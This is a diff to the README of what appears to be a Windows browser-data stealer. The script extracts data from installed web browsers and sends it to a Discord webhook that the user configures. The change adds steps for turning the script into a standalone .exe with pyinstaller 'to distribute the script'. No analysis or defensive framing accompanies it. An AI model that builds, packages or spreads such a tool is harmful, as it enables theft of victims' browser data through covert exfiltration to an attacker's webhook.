@@ -15,11 +15,23 @@ This script extracts various types of data from web browsers installed on a Wind
 
 3. Configure the WEBHOOK_URL variable in the main.py script with your Discord webhook URL.
 
-4. Run the script using the following command:
-   ```shell
-   python main.py
+4. Create an Executable File:
 
-5. The script will extract data from supported web browsers and send it to the configured Discord webhook.
+For to distribute the script as an executable (.exe), follow these steps:
+   
+   - Open a terminal in the directory where you have the main.py file.
+     
+   - Install pyinstaller if you haven't already:
+     ```shell
+     pip install pyinstaller
+     
+   - Create the executable file:
+     ```shell
+     pyinstaller --onefile main.py
+
+   - This will generate a dist folder containing the main.exe executable.
+
+   - The script will extract data from supported web browsers and send it to the configured Discord webhook.
 
 ## Supported Browsers
 
